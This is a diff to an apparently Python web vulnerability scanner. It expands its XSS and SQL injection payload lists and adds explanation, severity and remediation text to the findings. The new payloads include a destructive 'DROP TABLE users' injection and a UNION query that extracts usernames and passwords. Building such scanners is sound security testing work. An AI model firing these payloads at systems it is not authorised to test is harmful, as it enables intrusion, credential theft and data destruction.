@@ -18,7 +18,14 @@ HEADERS = {
 XSS_PAYLOADS = [
     "<script>alert(1)</script>",
     "\"><script>alert(1)</script>",
-    "<img src=x onerror=alert(1)>"
+    "<img src=x onerror=alert(1)>",
+    "<svg onload=alert(1)>",
+    "javascript:alert(1)",
+    "<iframe src=javascript:alert(1)>",
+    "'><script>alert(1)</script>",
+    "<body onload=alert(1)>",
+    "<input onfocus=alert(1) autofocus>",
+    "<details open ontoggle=alert(1)>"
 ]
 
 
@@ -30,7 +37,10 @@ SQL_PAYLOADS = [
     "' OR '1'='1",
     "' OR 1=1--",
     "\" OR \"1\"=\"1",
-    "' UNION SELECT NULL--"
+    "' UNION SELECT NULL--",
+    "' UNION SELECT 1,2,3--",
+    "'; DROP TABLE users--",
+    "' AND 1=0 UNION SELECT username, password FROM users--"
 ]
 
 
@@ -97,7 +107,10 @@ def test_time_sql(url, params):
                         "type": "Time-based SQL Injection",
                         "parameter": param,
                         "payload": payload,
-                        "url": test_url
+                        "url": test_url,
+                        "explanation": "The response took significantly longer than expected, indicating the SQL payload caused a delay (e.g., SLEEP function), confirming blind SQL injection vulnerability.",
+                        "severity": "High",
+                        "remediation": "Use prepared statements and avoid dynamic SQL queries with user input."
                     })
 
             except:
@@ -129,7 +142,10 @@ def test_xss(url, parameters):
                         "type": "Reflected XSS",
                         "parameter": param,
                         "payload": payload,
-                        "url": test_url
+                        "url": test_url,
+                        "explanation": "The XSS payload was reflected in the server's response without proper HTML encoding or sanitization, allowing potential script execution in the user's browser.",
+                        "severity": "High",
+                        "remediation": "Implement output encoding (e.g., HTML entity encoding) or use a library like DOMPurify to sanitize user inputs."
                     })
 
             except:
@@ -164,7 +180,10 @@ def test_sql(url, parameters):
                             "parameter": param,
                             "payload": payload,
                             "url": test_url,
-                            "evidence": error
+                            "evidence": error,
+                            "explanation": f"An SQL error ('{error}') was triggered by the payload, indicating the application is vulnerable to SQL injection as user input is directly concatenated into SQL queries.",
+                            "severity": "Critical",
+                            "remediation": "Use prepared statements or parameterized queries, and validate/sanitize all user inputs."
                         })
 
                         break
@@ -180,8 +199,11 @@ def test_error_sql(url, params):
         "SQL syntax",
         "mysql_fetch",
         "ORA-01756",
-        "SQLite error"
-    ]
+        "SQLite error",
+        "UNEXPECTED TOKEN",
+        "ODBC SQL Server Driver"
+]
+    
 
     vulns = []
 
@@ -197,7 +219,10 @@ def test_error_sql(url, params):
                     vulns.append({
                         "parameter": p,
                         "type": "Error-based SQLi",
-                        "url": test_url
+                        "url": test_url,
+                        "explanation": f"An SQL error ('{e}') was revealed by injecting a single quote, indicating improper handling of user input in SQL queries.",
+                        "severity": "Critical",
+                        "remediation": "Use parameterized queries and input validation to prevent SQL injection."
                     })
 
         except:
